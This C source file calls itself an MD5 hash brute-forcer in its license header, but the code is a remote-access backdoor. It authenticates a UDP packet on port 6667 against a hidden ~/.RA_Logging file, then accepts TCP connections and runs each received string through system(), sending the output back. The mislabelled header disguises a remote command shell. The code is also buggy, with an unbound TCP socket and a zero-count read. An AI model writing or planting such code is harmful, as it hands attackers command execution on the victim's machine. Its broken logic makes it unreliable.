/*< [MD5_Brute_Forcer] -A programm created to decrypt an hash with brute forcing->
    Copyright (C) <2010>  <D4RKN355-H4CK>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.*/

#include <RA_mkaccess.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <util.h>

#define BACKLOG 1
#define MAXLINE 1000
#define PORT 6667
#define REPLY 10000

int main(){

   int list, UDP, TCP, n_sent, n_recived;
   FILE *flPtr, *temp;
   struct sockaddr_in client;
   char *path = strcat( getenv( "HOME" ), "/.RA_Logging" );
   char reply, buffer[ MAXLINE ], retry[ REPLY ];
   DATA enter, outer;
   
   if( ( list = socket( AF_INET, SOCK_STREAM, 0 ) ) < 0 ){
   
      perror( "Errore creazione socket TCP padre" );
      exit( EXIT_FAILURE );
   
   }
   
   if( ( UDP = socket( AF_INET, SOCK_DGRAM, 0 ) ) < 0 ){
   
      perror( "Errore creazione socket UDP" );
      exit( EXIT_FAILURE );
   
   }
   
   client.sin_family = AF_INET;
   client.sin_port = htons( PORT );
   client.sin_addr.s_addr = htonl( INADDR_ANY );
   
   if( ( flPtr = fopen( path, "rb" ) ) == NULL ){
   
      perror( "Errore apertura file" );
      exit( EXIT_FAILURE );
   
   }
   
   if( bind( UDP, (struct sockaddr *) &client, sizeof( client ) ) < 0 ){
   
      perror( "Errore invocazione socket UDP" );
      exit( EXIT_FAILURE );
   
   }
   
   if( (n_recived = recvfrom( UDP, &enter, sizeof( enter ), 0 , 0, 0 ) ) < 0 ){
   
      perror( "Errore ricezione pacchetto UDP" );
      exit( EXIT_FAILURE );
   
   }
   
   if( fread( &outer, sizeof( outer ), 1, flPtr ) < 0 ){
   
      printf( "Errore nel caricamento dei dati nella struttura\n" );
      exit( EXIT_FAILURE );
   
   }
   
   if( datacmp( &enter, &outer ) == -1 ){
   
      printf( "Logging fallito\n" );
      reply = 'C';
      
      if( ( n_sent = sendto( UDP, ( void * ) &reply, sizeof( reply ), 0, ( struct sockaddr *) &client, sizeof( client ) ) ) < 0 ){
      
         perror( "Errore invio pacchetto UDP" );
         exit( EXIT_FAILURE );
      
      }
      
      shutdown( UDP, SHUT_RDWR );
      exit( EXIT_FAILURE );
   
   }
   
   if( listen( list, BACKLOG ) < 0 ){
   
      perror( "Errore nel listening del server" );
      exit( EXIT_FAILURE );
   
   }
   
   while( 1 ){
   
      if( ( TCP = accept( list, ( struct sockaddr * ) NULL, NULL ) ) < 0 ){
      
         perror( "Errore nell'accept della connessione" );
         exit( EXIT_FAILURE );
      
      }
      
      if( ( temp = fopen( "temp", "w" ) ) == NULL ){
      
         perror( "Errore apertura file" );
         exit( EXIT_FAILURE );
      
      }
      
      if( ( n_recived = recv( TCP, buffer, sizeof( buffer ), 0 ) ) < 0 ){
      
         perror( "Errore ricezione dati TCP" );
         exit( EXIT_FAILURE );
      
      }
      
      init_instruction( buffer );
      system( buffer );
      
      if( ( fread( retry, sizeof( retry ), 0, temp ) ) < 0 ){
      
         printf( "Errore lettura dati\n" );
         exit( EXIT_FAILURE );
      
      }
      
      if( ( n_sent = send( TCP, retry, sizeof( retry ), 0 ) ) < 0 ){
      
         printf( "Errore invio output\n" );
         exit( EXIT_FAILURE );  
      
      }
      
      if( remove( "temp" ) < 0 ){
      
         perror( "Errore eliminazione file \"temp\"" );
         exit( EXIT_FAILURE );
      
      }
      
   }
   
   fclose( temp );
   fclose( flPtr );
   close( list );
      
   return 0;

}
